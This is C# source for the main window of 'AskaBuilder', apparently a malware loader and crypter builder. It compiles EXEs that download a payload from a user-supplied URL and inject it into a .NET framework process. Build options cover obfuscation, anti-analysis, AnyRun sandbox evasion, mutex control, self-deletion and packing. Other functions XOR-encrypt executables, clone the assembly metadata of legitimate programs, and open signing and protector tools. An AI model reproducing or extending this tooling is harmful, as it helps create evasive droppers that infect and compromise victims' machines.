using AskaBuilder.AskaAlgorithms.Builder;
using AskaBuilder.AskaAlgorithms.FormHelper;
using AskaBuilder.AskaForms;
using System;
using System.IO;
using System.Windows.Forms;

namespace AskaBuilder
{
    public partial class MainWindow : Form
    {
        private string IconPath; // Icon path to set in build process.
        private string AssemblyPath; // Assembly path to include in build process.
        private readonly byte[] XorBytes = EncryptEngine.GenerateRandomBytes(32);
        public MainWindow()
        {
            InitializeComponent();
        }
        #region Builder Functions
        
        private void BuildBtn_Click(object sender, EventArgs e)
        {
            bool
                Obfuscate = Obfuscation_Chk.Checked,
                AntiAnalysis = AntiAnalysis_Chk.Checked,
                MutexControl = MutexControl_Chk.Checked,
                SelfDelete = SelfDelete_Chk.Checked,
                Packer = UsePackerChk.Checked,
                AntiAnyRun = AntiAnyRun_Chk.Checked;

            string
                Url = UrlFile.Text,
                InjectProcess = "C:\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\v4.0.30319\\\\" + InjectProcessBox.Text,
                MutexValue = MutexControl ? MutexBox.Text : null;

            if (string.IsNullOrEmpty(Url) || (MutexControl && string.IsNullOrEmpty(MutexValue)) ||string.IsNullOrEmpty(InjectProcessBox.Text))
            {
                MessageBoxEx.Text = "Fields cannot be empty\nPlease fill all textboxes"; MessageBoxEx.Show(); return;
            }

            if (!HasHttpPrefix(Url))
            {
                MessageBoxEx.Text = "You need a write http/s prefix before the start of the link!\nExample: http://example.com/File.exe"; MessageBoxEx.Show(); return;
            }

            using (SaveFileDialog save = new SaveFileDialog())
            {
                save.Title = "Compiled file saver - [ A S K A ]";
                save.Filter = "EXE (*.exe)|*.exe";

                if (save.ShowDialog() == DialogResult.OK)
                {
                    bool result = BuilderEngine.Compilate(Url, XorBytes, InjectProcess, save.FileName, SelfDelete, AntiAnalysis, AntiAnyRun, MutexControl, MutexValue, Obfuscate, Packer, AssemblyPath, IconPath);
                    
                    if (result)
                    {
                        MessageBoxEx.Text = $"Compilation completed successfully!\nOutput File: {Path.GetFileName(save.FileName)}"; MessageBoxEx.Show();
                    }
                    else
                    {
                        MessageBoxEx.Text = $"Compilation failed!\n Check error logs -> compilation_errors.txt"; MessageBoxEx.Show();
                    }
                }
            }
        }

        private void MutexControl_Chk_CheckedChanged(object sender, EventArgs e)
        {
            if (MutexBox.Enabled)
            {
                MutexBox.Clear();
                MutexBox.Enabled = false;
            } else
            {
                MutexBox.Enabled = true;
            }
        }

        private void GenerateMutexBtn_Click(object sender, EventArgs e)
        {
            if (MutexBox.Enabled)
            {
                MutexBox.Text = EncryptEngine.GenerateRandStr(19);
            }
            else
            {
                MessageBoxEx.Text = "You have not enabled the Mutex-Control option before generating a random value, please enable it in the compilation by clicking on the CheckBox - MutexControl";
                MessageBoxEx.Show();
            }
        }
        private static bool HasHttpPrefix(string url)
        {
            return url.StartsWith("http://", StringComparison.OrdinalIgnoreCase) ||
                   url.StartsWith("https://", StringComparison.OrdinalIgnoreCase);
        }

        #endregion

        #region MainForm Forms Clicker
        private void OpenProtectorForm_Click(object sender, EventArgs e) // Open protector form.
        {
            ProtectorWindow protector = new ProtectorWindow();
            protector.Show();
        }

        private void OpenSignForm_Click(object sender, EventArgs e) // Open sign-tool form.
        {
            SignWindow signWindow = new SignWindow();
            signWindow.Show();
        }

        private void OpenAboutForm_Click(object sender, EventArgs e) // Open about form.
        {
            AboutWindow aboutWindow = new AboutWindow();
            aboutWindow.Show();
        }


        #endregion

        #region Encrypt Form
        private void EncryptFileBtn_Click(object sender, EventArgs e) // Save encrypt file event.
        {
            string FileToEncrypt = FileEncryptPath.Text;
            // XorGenTimer.Stop();

            if (string.IsNullOrEmpty(FileToEncrypt))
            {
                MessageBoxEx.Text = "The file path field cannot be empty.\nPlease select a file for further encryption.";
                
                MessageBoxEx.Show();
                return;
            }

            // XorGenTimer.Stop();

            using (SaveFileDialog save = new SaveFileDialog())
            {
                save.Title = $"Encrypted file saver - [ A S K A ] - ";
                save.Filter = "Aska Files (*.aska)|*.aska|All Files (*.*)|*.*";

                if (save.ShowDialog() == DialogResult.OK)
                {
                    EncryptEngine.EncryptFileAndSave(FileToEncrypt, XorBytes, save.FileName);

                    MessageBoxEx.Text = "File encrypted succesfully!";
                    MessageBoxEx.Show();
                    return;
                }
            }
        }

        private void SelectFileBtn_Click(object sender, EventArgs e) // Select file to encrypt.
        {
            using (OpenFileDialog open = new OpenFileDialog())
            {
                open.Title = "Open EXE file to encrypt - [ A S K A ] -";
                open.Filter = "EXE (*.exe)|*.exe";

                if (open.ShowDialog() == DialogResult.OK)
                {
                    FileEncryptPath.Text = open.FileName;
                }
            }
        }

        private void ClearBoxesBtn_Click(object sender, EventArgs e)
        {
            FileEncryptPath.Clear(); EncryptionXorKey.Clear();
        }
        #endregion

        #region File Manager

        private void SelectIconBtn_Click(object sender, EventArgs e) // Select icon function.
        {
            string IconsDir = Path.Combine(Application.StartupPath, "Icons");
            using (OpenFileDialog open = new OpenFileDialog())
            {

                open.Title = "Open ICO file - [ A S K A ] -";
                open.Filter = "ICO (*.ico)|*.ico";

                if (Directory.Exists(IconsDir))
                {
                    open.InitialDirectory = IconsDir;
                }

                if (open.ShowDialog() == DialogResult.OK)
                {
                    IconBox.ImageLocation = open.FileName;
                    IconPath = open.FileName;
                }
            }
        }

        private void CloneAssemblyBtn_Click(object sender, EventArgs e)
        {
            string AssemblyPathFile = Path.Combine(Path.GetTempPath(), $"{Guid.NewGuid()}.metadata");

            using (OpenFileDialog open = new OpenFileDialog())
            {
                open.Title = "Open EXE file to clone assembly - [ A S K A ] -";
                open.Filter = "EXE Files (*.exe)|*.exe";

                if (open.ShowDialog() == DialogResult.OK)
                {
                    AssemblyPath = AssemblyEngine.ExtractAndWriteVersionInfo(open.FileName, AssemblyPathFile);
                    MessageBoxEx.Text = $"File with information that will be used to clone assembly data: {Path.GetFileNameWithoutExtension(AssemblyPath)}";

                    MessageBoxEx.Show();
                }
            }
        }
        #endregion

        #region Form Helper
        private void InitializeTimer() // Initialize timer to generate xor-key.
        {
            XorGenTimer = new Timer();
            XorGenTimer.Interval = 100;
            XorGenTimer.Tick += Timer_Tick;
            XorGenTimer.Start();
        }

        private void Timer_Tick(object sender, EventArgs e) // Tick function.
        {
            string xorKey = EncryptEngine.GenerateStrBytes(20);
            EncryptionXorKey.Text = xorKey; BuildXorKey.Text = xorKey;
        }

        private void MainWindow_Load(object sender, EventArgs e) // Load functions.
        {
            InitializeTimer();
        }
        #endregion
    }
}
